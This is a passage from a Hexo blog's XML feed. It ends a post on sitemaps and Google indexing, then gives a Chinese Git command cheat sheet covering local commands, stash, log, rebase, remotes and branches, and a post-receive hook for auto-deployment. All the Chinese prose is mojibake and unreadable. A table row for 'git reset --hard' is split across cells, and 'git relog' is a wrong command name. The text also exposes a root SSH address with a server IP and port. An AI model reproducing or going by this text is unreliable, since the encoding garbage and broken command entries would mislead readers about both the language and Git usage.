--save</code></p><p>åœ¨åšå®¢æ ¹ç›®å½•çš„_config.ymlä¸­æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">sitemap:</span></span><br><span class="line"><span class="symbol">path:</span> sitemap.xml</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ç¼©è¿›å¾ˆé‡è¦(ä¸è§£é‡Šï¼Œè¯•ä¸€ä¸‹å°±çŸ¥é“äº†),ç„¶åç¼–è¯‘å¹¶éƒ¨ç½²åšå®¢ã€‚</p><h3 id="6-è®©Googleæ”¶å½•åšå®¢"><a href="#6-è®©Googleæ”¶å½•åšå®¢" class="headerlink" title="6 è®©Googleæ”¶å½•åšå®¢"></a>6 è®©Googleæ”¶å½•åšå®¢</h3><p>å‘<a href="https://www.google.com/webmasters/tools" target="_blank" rel="noopener">Googleç«™é•¿å·¥å…·</a>æäº¤sitemap</p><p>æ·»åŠ äº†ç«™ç‚¹éªŒè¯é€šè¿‡åï¼Œé€‰æ‹©ç«™ç‚¹ï¼Œä¹‹ååœ¨æŠ“å–â€”â€”ç«™ç‚¹åœ°å›¾ä¸­å°±èƒ½çœ‹åˆ°æ·»åŠ /æµ‹è¯•ç«™ç‚¹åœ°å›¾<br><img src="http://babymaychen.github.io/uploads/sitemap.png" alt=""></p><hr><p>å‚è€ƒèµ„æ–™</p><ol><li><a href="http://babymaychen.github.io/2016/07/20/%E5%A6%82%E4%BD%95%E8%AE%A9%E4%BD%A0%E7%9A%84%E5%8D%9A%E5%AE%A2%E8%A2%ABGoogle%E5%88%B0/" target="_blank" rel="noopener">å­™å°å¦¹çš„åšå®¢</a></li><li><a href="https://zhuanlan.zhihu.com/p/55796365" target="_blank" rel="noopener">Hexo åšå®¢ä¼˜åŒ–ä¹‹ Next ä¸»é¢˜åŠŸèƒ½å¼ºåŒ–</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Gitå¸¸ç”¨å‘½ä»¤æ€»ç»“</title>
      <link href="/post/git-notes/"/>
      <url>/post/git-notes/</url>
      
        <content type="html"><![CDATA[<p>è¿™å¯èƒ½æ˜¯ä¸œåŠçƒæœ€è¯¦ç»†çš„Gitå‘½ä»¤æ€»ç»“äº†:-)</p><a id="more"></a><blockquote><ol><li>Gitä½¿ç”¨æ•™ç¨‹â€”â€”<a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">ã€ŠPro Gitã€‹</a></li><li>Gitè§†é¢‘æ•™ç¨‹<a href="http://study.163.com/course/courseMain.htm?courseId=1003268008" target="_blank" rel="noopener">äººäººéƒ½ä¼šç”¨git</a></li><li>gitåœ¨æœ¬åœ°åˆ†ä¸º3ä¸ªåŒºï¼šå·¥ä½œåŒºï¼Œæš‚å­˜åŒºå’Œæœ¬åœ°ä»“åº“ã€‚<br>Gitæ›´åƒæ˜¯æŠŠæ•°æ®çœ‹ä½œæ˜¯å¯¹å°å‹æ–‡ä»¶ç³»ç»Ÿçš„ä¸€ç»„å¿«ç…§ã€‚æ¯æ¬¡ä½ æäº¤æ›´æ–°ï¼Œæˆ–åœ¨ Git ä¸­ä¿å­˜é¡¹ç›®çŠ¶æ€æ—¶ï¼Œå®ƒä¸»è¦å¯¹å½“æ—¶çš„å…¨éƒ¨æ–‡ä»¶åˆ¶ä½œä¸€ä¸ªå¿«ç…§å¹¶ä¿å­˜è¿™ä¸ªå¿«ç…§çš„ç´¢å¼•ã€‚ä¸ºäº†é«˜æ•ˆï¼Œå¦‚æœæ–‡ä»¶æ²¡æœ‰ä¿®æ”¹ï¼ŒGit ä¸å†é‡æ–°å­˜å‚¨è¯¥æ–‡ä»¶ï¼Œè€Œæ˜¯åªä¿ç•™ä¸€ä¸ªé“¾æ¥æŒ‡å‘ä¹‹å‰å­˜å‚¨çš„æ–‡ä»¶ã€‚ Git å¯¹å¾…æ•°æ®æ›´åƒæ˜¯ä¸€ä¸ªå¿«ç…§æµã€‚</li><li>gitä¸­ä»»ä½•<em>å·²æäº¤</em>çš„ä¸œè¥¿å‡ ä¹æ€»æ˜¯å¯ä»¥æ¢å¤çš„ã€‚ ç”šè‡³é‚£äº›è¢«åˆ é™¤çš„åˆ†æ”¯ä¸­çš„æäº¤æˆ–ä½¿ç”¨ <code>--amend</code> é€‰é¡¹è¦†ç›–çš„æäº¤ä¹Ÿå¯ä»¥æ¢å¤</li><li><a href="https://dotblogs.com.tw/wasichris/2016/04/29/225157" target="_blank" rel="noopener">[Git] Reset - mixed, hard and soft</a></li><li><a href="https://www.zybuluo.com/phper/note/223883" target="_blank" rel="noopener">git pullå’Œgit fetchã€git reset å’Œ git revert çš„åŒºåˆ«ç”¨æ³•</a></li></ol></blockquote><hr><h1 id="ä¸€ã€æœ¬åœ°æ“ä½œ"><a href="#ä¸€ã€æœ¬åœ°æ“ä½œ" class="headerlink" title="ä¸€ã€æœ¬åœ°æ“ä½œ"></a>ä¸€ã€æœ¬åœ°æ“ä½œ</h1><h2 id="1-1-åŸºç¡€å‘½ä»¤"><a href="#1-1-åŸºç¡€å‘½ä»¤" class="headerlink" title="1.1 åŸºç¡€å‘½ä»¤"></a>1.1 åŸºç¡€å‘½ä»¤</h2><table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>git init [directory]</code></td><td>åˆå§‹åŒ–gitæœ¬åœ°ä»“åº“</td></tr><tr><td>`git reset â€“hard commit-id</td><td>HEAD^</td></tr><tr><td><code>git relog</code></td><td>æŸ¥çœ‹gitå†å²æ“ä½œå‘½ä»¤</td></tr><tr><td><code>git rm --cached file_name</code></td><td>åˆ é™¤æš‚å­˜åŒºçš„æ–‡ä»¶,å¦‚æœæš‚å­˜åŒºçš„æ–‡ä»¶<strong>è¢«ä¿®æ”¹</strong>ï¼Œåˆ™<strong>éœ€è¦ä½¿ç”¨<code>-f</code>å‚æ•°</strong></td></tr><tr><td><code>git mv file_from file_to</code></td><td>ä¿®æ”¹æ–‡ä»¶å</td></tr><tr><td><code>git reset HEAD filename</code></td><td>å–æ¶ˆæš‚å­˜çš„æ–‡ä»¶ï¼ˆä¸¢å¼ƒ<code>git add</code>åçš„æ–‡ä»¶ï¼‰</td></tr><tr><td><code>git checkout .</code></td><td>ä¸¢å¼ƒå·¥ä½œåŒºæ‰€æœ‰æ–‡ä»¶çš„ä¿®æ”¹</td></tr><tr><td><code>git checkout -- filename</code></td><td>ä¸¢å¼ƒå·¥ä½œåŒºæŒ‡å®šæ–‡ä»¶çš„ä¿®æ”¹ï¼ˆ <em>æ³¨æ„æ–‡ä»¶åå‰çš„ç©ºæ ¼</em> ï¼‰</td></tr><tr><td><code>git checkout HEAD .</code></td><td>ä¸¢å¼ƒå·¥ä½œåŒºä¸æš‚å­˜åŒºçš„æ‰€æœ‰æ–‡ä»¶çš„ä¿®æ”¹</td></tr><tr><td><code>git checkout HEAD -- filename</code></td><td>ä¸¢å¼ƒæ€»åšåŒºä¸æš‚å­˜åŒºæŒ‡å®šæ–‡ä»¶çš„ä¿®æ”¹</td></tr><tr><td><code>git config --list</code></td><td>æŸ¥çœ‹gitçš„é…ç½®ä¿¡æ¯</td></tr></tbody></table><h2 id="1-2-å…‹éš†"><a href="#1-2-å…‹éš†" class="headerlink" title="1.2 å…‹éš†"></a>1.2 å…‹éš†</h2><p>Git å…‹éš†çš„æ˜¯è¯¥ Git ä»“åº“æœåŠ¡å™¨ä¸Šçš„å‡ ä¹æ‰€æœ‰æ•°æ®ï¼Œè€Œä¸æ˜¯ä»…ä»…å¤åˆ¶å®Œæˆä½ çš„å·¥ä½œæ‰€éœ€è¦æ–‡ä»¶ã€‚ å½“ä½ æ‰§è¡Œ git clone å‘½ä»¤çš„æ—¶å€™ï¼Œé»˜è®¤é…ç½®ä¸‹è¿œç¨‹ Git ä»“åº“ä¸­çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„æ¯ä¸€ä¸ªç‰ˆæœ¬éƒ½å°†è¢«æ‹‰å–ä¸‹æ¥ã€‚</p><p>å…‹éš†å‘½ä»¤ï¼š<code>git clone git@github.com:user/repo.git  [local_repo_name]</code><br>cloneæ—¶ç«¯å£å·ä¸ä¸ºé»˜è®¤çš„22æ—¶ï¼Œéœ€å°†å‘½ä»¤ä¿®æ”¹ä¸º <code>$git clone ssh://user@host:port/user/repo.git [local_repo_name]</code></p><h2 id="1-3-æ¯”è¾ƒ"><a href="#1-3-æ¯”è¾ƒ" class="headerlink" title="1.3 æ¯”è¾ƒ"></a>1.3 æ¯”è¾ƒ</h2><p><code>git diff</code>æŸ¥çœ‹å·¥ä½œåŒºä¸æš‚å­˜åŒºæ–‡ä»¶çš„å·®å¼‚<br><code>git diff --cached</code>æŸ¥çœ‹æš‚å­˜åŒºä¸æœ¬åœ°ä»“åº“çš„æ–‡ä»¶å·®å¼‚<br><code>git diff HEAD</code>æŸ¥çœ‹å·¥ä½œåŒºä¸æœ¬åœ°ä»“åº“çš„æ–‡ä»¶å·®å¼‚</p><h2 id="1-4-æäº¤"><a href="#1-4-æäº¤" class="headerlink" title="1.4 æäº¤"></a>1.4 æäº¤</h2><p><code>git commit -m &#39;description&#39;</code><br><code>git commit -a -m &#39;description&#39;</code>å°†<code>git add</code>ä¸<code>git commit</code>å‘½ä»¤åˆå¹¶ä½¿ç”¨ï¼Œæ­¤æ—¶ä¼šè‡ªåŠ¨å°†å·²è·Ÿè¸ªçš„æ–‡ä»¶åŠ å…¥æš‚å­˜å¹¶æäº¤<br><code>git commit --amend</code>ä¿®æ”¹æäº¤ä¿¡æ¯ã€‚è‹¥æ–‡ä»¶Aå·²ç»æäº¤ï¼Œç„¶åå‘ç°æ–‡ä»¶Bå¿˜è®°æäº¤ï¼Œå¯ä»¥æ‰§è¡Œ<code>git add B</code>åæ‰§è¡Œ<code>git commit --amend</code>ï¼Œæ¥å®ç°Aï¼ŒBåŒæ—¶æäº¤çš„æ•ˆæœã€‚</p><h2 id="1-5-å‚¨è—"><a href="#1-5-å‚¨è—" class="headerlink" title="1.5 å‚¨è—"></a>1.5 å‚¨è—</h2><table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>git stash</code></td><td>å°†å½“å‰å·¥ä½œåŒºå†…å®¹å‚¨è—</td></tr><tr><td><code>git stash list</code></td><td>æŸ¥çœ‹å‚¨è—çš„æ‰€æœ‰å†…å®¹</td></tr><tr><td><code>git stash show -p stash@{n}</code></td><td>æ˜¾ç¤ºå‚¨è—å†…å®¹</td></tr><tr><td><code>git stash apply</code></td><td>å°†æœ€è¿‘å‚¨è—çš„æ–‡ä»¶å–å›åˆ°å·¥ä½œåŒºï¼Œæ ˆä¸­ä»å­˜åœ¨è¯¥å‚¨è—æ–‡ä»¶</td></tr><tr><td><code>git stash apply stash@{n}</code></td><td>å–å‡ºæŒ‡å®šå‚¨è—çš„æ–‡ä»¶</td></tr><tr><td><code>git stash pop</code></td><td>åº”ç”¨å‚¨è—å¹¶åˆ é™¤æ ˆä¸­å†…å®¹</td></tr><tr><td><code>git stash drop stash@{n}</code></td><td>ä¸¢å¼ƒå‚¨è—å†…å®¹</td></tr><tr><td><code>git stash -u</code></td><td>æš‚å­˜æœªè¢«è·Ÿè¸ªçš„æ–‡ä»¶</td></tr></tbody></table><h2 id="1-6-æŸ¥çœ‹å†å²"><a href="#1-6-æŸ¥çœ‹å†å²" class="headerlink" title="1.6 æŸ¥çœ‹å†å²"></a>1.6 æŸ¥çœ‹å†å²</h2><table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>git log</code></td><td>æ˜¾ç¤ºè¯¦ç»†è®°å½•</td></tr><tr><td><code>git log -p -2</code></td><td>æŸ¥çœ‹æœ€è¿‘2æ¬¡çš„æäº¤ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¢«æ”¹åŠ¨çš„å†…å®¹</td></tr><tr><td><code>git log --stat</code></td><td>æ˜¾ç¤ºæ¯æ¬¡æäº¤çš„ç»Ÿè®¡ä¿¡æ¯</td></tr><tr><td><code>git log --pretty=oneline</code> æˆ– <code>git log --oneline</code></td><td>ç®€è¦æ˜¾ç¤ºæäº¤ä¿¡æ¯</td></tr><tr><td><code>git log --graph</code></td><td>å›¾å½¢åŒ–æ˜¾ç¤ºåˆ†æ”¯ã€åˆå¹¶å†å²</td></tr><tr><td><br></td><td></td></tr></tbody></table><center> `git log`è¾“å‡ºé€‰é¡¹</center><table><thead><tr><th align="left">é€‰é¡¹</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left"><code>-n</code></td><td align="left">ä»…æ˜¾ç¤ºæœ€è¿‘çš„næ¡æäº¤</td></tr><tr><td align="left"><code>--since</code>, <code>--after</code></td><td align="left">ä»…æ˜¾ç¤ºæŒ‡å®šæ—¶é—´ä¹‹åçš„æäº¤</td></tr><tr><td align="left"><code>--until</code>, <code>--before</code></td><td align="left">ä»…æ˜¾ç¤ºæŒ‡å®šæ—¶é—´ä¹‹å‰çš„æäº¤</td></tr><tr><td align="left"><code>--author</code></td><td align="left">ä»…æ˜¾ç¤ºæŒ‡å®šä½œè€…ç›¸å…³çš„æäº¤</td></tr><tr><td align="left"><code>--committer</code></td><td align="left">ä»…æ˜¾ç¤ºæŒ‡å®šæäº¤è€…çš„ç›¸å…³æäº¤</td></tr><tr><td align="left"><code>--grep</code></td><td align="left">ä»…æ˜¾ç¤ºå«æŒ‡å®šå…³é”®å­—çš„æäº¤</td></tr><tr><td align="left"><code>--decorate</code></td><td align="left">æŸ¥çœ‹æŒ‡é’ˆæƒ…å†µ</td></tr><tr><td align="left"><code>-S</code></td><td align="left">ä»…æ˜¾ç¤ºæ·»åŠ æˆ–ç§»é™¤äº†æŸä¸ªå…³é”®å­—çš„æäº¤</td></tr></tbody></table><h2 id="1-7-å˜åŸº"><a href="#1-7-å˜åŸº" class="headerlink" title="1.7 å˜åŸº"></a>1.7 å˜åŸº</h2><p><strong>è¯·å‹¿åœ¨æœ¬åœ°ä»“åº“å¤–æœ‰å‰¯æœ¬çš„åˆ†æ”¯æ‰§è¡Œå˜åŸºæ“ä½œï¼</strong><br>å˜åŸºèƒ½å¤Ÿè®©æäº¤å†å²å˜å¾—æ›´åŠ ç®€æ´ã€‚<br>åªå¯¹å°šæœªæ¨é€æˆ–åˆ†äº«ç»™åˆ«äººçš„æœ¬åœ°ä¿®æ”¹æ‰§è¡Œå˜åŸºæ“ä½œæ¸…ç†å†å²ï¼Œä»ä¸å¯¹å·²æ¨é€è‡³åˆ«å¤„çš„æäº¤æ‰§è¡Œå˜åŸºæ“ä½œã€‚<br><code>git rebase master dev</code>å°†devåˆ†æ”¯å†…å®¹å˜åŸºåˆ°masteråˆ†æ”¯ä¸Š</p><p>å˜åŸºå‰ï¼š<br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0p2zoih3j308b02k74e.jpg" alt="git branch"></p><p>å˜åŸºåï¼š<br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0p85qtisj308e02baa6.jpg" alt="git rebase"></p><p>å‡è®¾ä½ å¸Œæœ›å°† client ä¸­çš„ä¿®æ”¹åˆå¹¶åˆ°ä¸»åˆ†æ”¯å¹¶å‘å¸ƒï¼Œä½†æš‚æ—¶å¹¶ä¸æƒ³åˆå¹¶ server ä¸­çš„ä¿®æ”¹ï¼Œå› ä¸ºå®ƒä»¬è¿˜éœ€è¦ç»è¿‡æ›´å…¨é¢çš„æµ‹è¯•ã€‚ è¿™æ—¶ï¼Œä½ å°±å¯ä»¥ä½¿ç”¨ git rebase å‘½ä»¤çš„ â€“onto é€‰é¡¹ï¼Œé€‰ä¸­åœ¨ client åˆ†æ”¯é‡Œä½†ä¸åœ¨ server åˆ†æ”¯é‡Œçš„ä¿®æ”¹ï¼ˆå³ C8 å’Œ C9ï¼‰ï¼Œå°†å®ƒä»¬åœ¨ master åˆ†æ”¯ä¸Šé‡æ”¾ï¼š<code>$ git rebase --onto master server client</code><br>å¤šåˆ†æ”¯å˜åŸºå‰ï¼š<br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0p8naoxoj30ip0b0q37.jpg" alt="å¤šåˆ†æ”¯å˜åŸº"><br>å¤šåˆ†æ”¯å˜åŸºå<br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0p9jlmrsj30i807aweo.jpg" alt="å¤šåˆ†æ”¯å˜åŸºç»“æœ"></p><hr><h1 id="äºŒã€è¿œç¨‹ä»“åº“"><a href="#äºŒã€è¿œç¨‹ä»“åº“" class="headerlink" title="äºŒã€è¿œç¨‹ä»“åº“"></a>äºŒã€è¿œç¨‹ä»“åº“</h1><table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>git remote</code></td><td>æ˜¾ç¤ºæœ¬åœ°ä»“åº“å…³è”çš„æ‰€æœ‰è¿œç¨‹ä»“åº“</td></tr><tr><td><code>git remote -v</code></td><td>æ˜¾ç¤ºè¿œç¨‹ä»“åº“çš„URL</td></tr><tr><td><code>git remote add local-repo-name url</code></td><td>å…³è”è¿œç¨‹ä»“åº“</td></tr><tr><td><code>git remote rm local-repo-name</code></td><td>å–æ¶ˆä¸è¿œç¨‹ä»“åº“çš„å…³è”</td></tr><tr><td><code>git fetch remote-name</code></td><td>æ‹‰å–è¿œç¨‹ä»“åº“çš„æ‰€æœ‰åˆ†æ”¯</td></tr><tr><td><code>git push remote-name branch-name</code></td><td>å°†å½“å‰åˆ†æ”¯æ¨é€åˆ°è¿œç¨‹åˆ†æ”¯</td></tr><tr><td><code>git remote show [remote-name]</code></td><td>æ˜¾ç¤ºæŒ‡å®šè¿œç¨‹ä»“åº“çš„è¯¦ç»†ä¿¡æ¯</td></tr><tr><td><code>git remote rename old-name new-name</code></td><td>é‡å‘½åè¿œç¨‹ä»“åº“å</td></tr></tbody></table><hr><h1 id="ä¸‰ã€åˆ†æ”¯"><a href="#ä¸‰ã€åˆ†æ”¯" class="headerlink" title="ä¸‰ã€åˆ†æ”¯"></a>ä¸‰ã€åˆ†æ”¯</h1><h2 id="3-1-åŸºç¡€å‘½ä»¤"><a href="#3-1-åŸºç¡€å‘½ä»¤" class="headerlink" title="3.1 åŸºç¡€å‘½ä»¤"></a>3.1 åŸºç¡€å‘½ä»¤</h2><table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>git branch branch-name [commit-hash]</code></td><td>æ–°å»ºåˆ†æ”¯</td></tr><tr><td><code>git checkout branch-name</code></td><td>åˆ‡æ¢åˆ†æ”¯</td></tr><tr><td><code>git checkout -b branch-name</code></td><td>æ–°å»ºå¹¶åˆ‡æ¢åˆ°æ–°åˆ†æ”¯</td></tr><tr><td><code>git branch</code></td><td>æŸ¥çœ‹æœ¬åœ°åˆ†æ”¯</td></tr><tr><td><code>git branch -r</code></td><td>æŸ¥çœ‹è¿œç¨‹åˆ†æ”¯</td></tr><tr><td><code>git branch -a</code></td><td>æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯</td></tr><tr><td><code>git branch -d branch-name</code></td><td>åˆ é™¤åˆ†æ”¯</td></tr><tr><td><code>git merge branch-name</code></td><td>åˆå¹¶åˆ†æ”¯åˆ°å½“å‰åˆ†æ”¯</td></tr><tr><td><code>git branch --merged</code></td><td>æŸ¥çœ‹å·²ç»åˆå¹¶åˆ†æ”¯</td></tr><tr><td><code>git branch --no-merged</code></td><td>æŸ¥çœ‹å°šæœªåˆå¹¶çš„åˆ†æ”¯</td></tr><tr><td><code>git branch -v</code></td><td>æŸ¥çœ‹åˆ†æ”¯çš„æœ€åä¸€æ¬¡æäº¤</td></tr><tr><td><code>git branch -vv</code></td><td>æŸ¥çœ‹æœ¬åœ°åˆ†æ”¯çš„è·Ÿè¸ªåˆ†æ”¯, ç¤ºä¾‹<a href="https://git-scm.com/book/zh/v2/Git-åˆ†æ”¯-è¿œç¨‹åˆ†æ”¯" target="_blank" rel="noopener">ç‚¹æ­¤</a></td></tr><tr><td><code>git push origin test:master</code></td><td>æœ¬åœ°åˆ†æ”¯testæ¨é€ç»™è¿œç¨‹masteråˆ†æ”¯ï¼ˆè‹¥masterä¸å­˜åœ¨ï¼Œåˆ™è‡ªåŠ¨åˆ›å»ºï¼‰</td></tr><tr><td><code>git push origin :test</code> æˆ– <code>git push origin --delete test</code></td><td>åˆ é™¤è¿œç¨‹teståˆ†æ”¯</td></tr></tbody></table><br>## 3.2 åˆ†æ”¯åˆå¹¶åˆ†æ”¯åˆå¹¶æ—¶ç›´æ¥ä¼šå°†å†…å®¹è¦†ç›–<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0pbdrj9pj30ch06vt8t.jpg" alt="åˆ†æ”¯åˆå¹¶"></p><br>## 3.3 åˆ†æ”¯å†²çªä»…å½“ä¿®æ”¹**åŒä¸€æ–‡ä»¶çš„åŒä¸€åŒºåŸŸ**çš„æ—¶å€™æ‰ä¼šäº§ç”Ÿå†²çªï¼Œgitæ— æ³•æ‰§è¡Œâ€œå¿«é€Ÿåˆå¹¶â€ï¼ˆå¦‚ä¸‹å›¾ï¼‰çš„åˆå¹¶å°±å¯èƒ½äº§ç”Ÿå†²çª<p><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0pco0ukcj30fg09xdg2.jpg" alt="åˆ†æ”¯å†²çª"><br>åˆ†æ”¯å†²çªè§£å†³åï¼Œéœ€è¦ä½¿ç”¨<code>git add</code>å’Œ<code>git commit</code>å‘½ä»¤å†æ¬¡æäº¤</p><br>>ç”±äº Git çš„åˆ†æ”¯å®è´¨ä¸Šä»…æ˜¯åŒ…å«æ‰€æŒ‡å¯¹è±¡æ ¡éªŒå’Œï¼ˆé•¿åº¦ä¸º 40 çš„ SHA-1 å€¼å­—ç¬¦ä¸²ï¼‰çš„æ–‡ä»¶ï¼Œæ‰€ä»¥å®ƒçš„åˆ›å»ºå’Œé”€æ¯éƒ½å¼‚å¸¸é«˜æ•ˆã€‚ åˆ›å»ºä¸€ä¸ªæ–°åˆ†æ”¯å°±ç›¸å½“äºå¾€ä¸€ä¸ªæ–‡ä»¶ä¸­å†™å…¥ 41 ä¸ªå­—èŠ‚ï¼ˆ40 ä¸ªå­—ç¬¦å’Œ 1 ä¸ªæ¢è¡Œç¬¦ï¼‰ï¼Œå¦‚æ­¤çš„ç®€å•èƒ½ä¸å¿«å—ï¼Ÿ<hr><h1 id="å››ã€Githubä¸­çš„é¡¹ç›®åœ°å€"><a href="#å››ã€Githubä¸­çš„é¡¹ç›®åœ°å€" class="headerlink" title="å››ã€Githubä¸­çš„é¡¹ç›®åœ°å€"></a>å››ã€Githubä¸­çš„é¡¹ç›®åœ°å€</h1><ul><li>HTTPSå½¢å¼ï¼š<code>https://github.com/&lt;user&gt;/&lt;project_name&gt;</code></li><li>SSHå½¢å¼ï¼š<code>git@github.com:&lt;user&gt;/&lt;project_name&gt;</code></li><li>é€šå¸¸å¯¹äºå…¬å¼€é¡¹ç›®å¯ä»¥ä¼˜å…ˆåˆ†äº«åŸºäº HTTPS çš„ URLï¼Œå› ä¸ºç”¨æˆ·å…‹éš†é¡¹ç›®ä¸éœ€è¦æœ‰ä¸€ä¸ª GitHub å¸å·ã€‚ å¦‚æœä½ åˆ†äº« SSH URLï¼Œç”¨æˆ·å¿…é¡»æœ‰ä¸€ä¸ªå¸å·å¹¶ä¸”ä¸Šä¼  SSH å¯†é’¥æ‰èƒ½è®¿é—®ä½ çš„é¡¹ç›®ã€‚ HTTPS URL ä¸ä½ è´´åˆ°æµè§ˆå™¨é‡ŒæŸ¥çœ‹é¡¹ç›®ç”¨çš„åœ°å€æ˜¯ä¸€æ ·çš„ã€‚</li></ul><hr><h1 id="äº”ã€ä½¿ç”¨Git-Hookså®ç°é¡¹ç›®è‡ªåŠ¨éƒ¨ç½²"><a href="#äº”ã€ä½¿ç”¨Git-Hookså®ç°é¡¹ç›®è‡ªåŠ¨éƒ¨ç½²" class="headerlink" title="äº”ã€ä½¿ç”¨Git Hookså®ç°é¡¹ç›®è‡ªåŠ¨éƒ¨ç½²"></a>äº”ã€ä½¿ç”¨Git Hookså®ç°é¡¹ç›®è‡ªåŠ¨éƒ¨ç½²</h1><p>YouTubeè§†é¢‘æ•™ç¨‹ï¼š<a href="https://www.youtube.com/watch?v=7-qAb4YZF2g" target="_blank" rel="noopener">Git deploy to staging server using post-receive hook<br>Auto-Buffer Options</a><br>gité’©å­æ•™ç¨‹ï¼š<a href="https://git-scm.com/book/zh/v2/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git-%E9%92%A9%E5%AD%90" target="_blank" rel="noopener">Gité’©å­</a></p><h2 id="ç¬¬ä¸€æ­¥ï¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªgitè£¸ä»“åº“"><a href="#ç¬¬ä¸€æ­¥ï¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªgitè£¸ä»“åº“" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªgitè£¸ä»“åº“"></a>ç¬¬ä¸€æ­¥ï¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªgitè£¸ä»“åº“</h2><p><code>$ sudo git init --bare sample.git  #åˆ›å»ºä¸€ä¸ªåä¸ºsampleçš„gitè£¸ä»“åº“</code></p><h2 id="ç¬¬äºŒæ­¥ï¼šé…ç½®è£¸ä»“åº“ä¸‹çš„hooksæ–‡ä»¶å¤¹çš„ä¸‹post-receiveï¼ˆè‹¥è¯¥æ–‡ä»¶ä¸å­˜åœ¨è¯·æ‰‹åŠ¨åˆ›å»ºï¼‰ï¼Œé…ç½®å†…å®¹ä¸ºï¼š"><a href="#ç¬¬äºŒæ­¥ï¼šé…ç½®è£¸ä»“åº“ä¸‹çš„hooksæ–‡ä»¶å¤¹çš„ä¸‹post-receiveï¼ˆè‹¥è¯¥æ–‡ä»¶ä¸å­˜åœ¨è¯·æ‰‹åŠ¨åˆ›å»ºï¼‰ï¼Œé…ç½®å†…å®¹ä¸ºï¼š" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šé…ç½®è£¸ä»“åº“ä¸‹çš„hooksæ–‡ä»¶å¤¹çš„ä¸‹post-receiveï¼ˆè‹¥è¯¥æ–‡ä»¶ä¸å­˜åœ¨è¯·æ‰‹åŠ¨åˆ›å»ºï¼‰ï¼Œé…ç½®å†…å®¹ä¸ºï¼š"></a>ç¬¬äºŒæ­¥ï¼šé…ç½®è£¸ä»“åº“ä¸‹çš„hooksæ–‡ä»¶å¤¹çš„ä¸‹post-receiveï¼ˆè‹¥è¯¥æ–‡ä»¶ä¸å­˜åœ¨è¯·æ‰‹åŠ¨åˆ›å»ºï¼‰ï¼Œé…ç½®å†…å®¹ä¸ºï¼š</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">GIT_WORK_TREE=/home/wwwroot/wxsxy/wxsxy git checkout -f  <span class="comment"># æ­¤å¤„è®¾ç½®ä½ è¦éƒ¨ç½²çš„é¡¹ç›®ç›®å½•å³å¯</span></span><br></pre></td></tr></table></figure><p>ç„¶åä¸ºæ­¤è„šæœ¬èµ‹äºˆå¯æ‰§è¡Œæƒé™<code>chmod +x post-receive</code></p><h2 id="ç¬¬ä¸‰æ­¥ï¼šï¼ˆç›®å‰æ–¹æ³•ä¸€å­˜åœ¨æ— æ³•æ¨é€çš„é—®é¢˜ï¼‰"><a href="#ç¬¬ä¸‰æ­¥ï¼šï¼ˆç›®å‰æ–¹æ³•ä¸€å­˜åœ¨æ— æ³•æ¨é€çš„é—®é¢˜ï¼‰" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šï¼ˆç›®å‰æ–¹æ³•ä¸€å­˜åœ¨æ— æ³•æ¨é€çš„é—®é¢˜ï¼‰"></a>ç¬¬ä¸‰æ­¥ï¼šï¼ˆç›®å‰æ–¹æ³•ä¸€å­˜åœ¨æ— æ³•æ¨é€çš„é—®é¢˜ï¼‰</h2><h3 id="æ–¹æ³•ä¸€ï¼šæœ¬åœ°ä»“åº“å…³è”è¿œç¨‹è£¸ä»“åº“"><a href="#æ–¹æ³•ä¸€ï¼šæœ¬åœ°ä»“åº“å…³è”è¿œç¨‹è£¸ä»“åº“" class="headerlink" title="æ–¹æ³•ä¸€ï¼šæœ¬åœ°ä»“åº“å…³è”è¿œç¨‹è£¸ä»“åº“"></a>æ–¹æ³•ä¸€ï¼šæœ¬åœ°ä»“åº“å…³è”è¿œç¨‹è£¸ä»“åº“</h3><p><code>git remote add origin ssh://root@107.182.180.235:26972/home/bare.gitï¼ˆç«¯å£å·éé»˜è®¤22çš„æƒ…å†µ ï¼‰</code><br>ç„¶åæœ¬åœ°ä»“åº“ä¸­ä»£ç ç¼–è¾‘å®Œæˆåæ¨é€è‡³è¿œç¨‹è£¸ä»“åº“ï¼Œè£¸ä»“åº“ä¼šè‡ªåŠ¨å°†ä»£ç éƒ¨ç½²åˆ°æœåŠ¡å™¨çš„é¡¹ç›®åœ°å€ä¸‹<br><code>git push origin master</code></p><h3 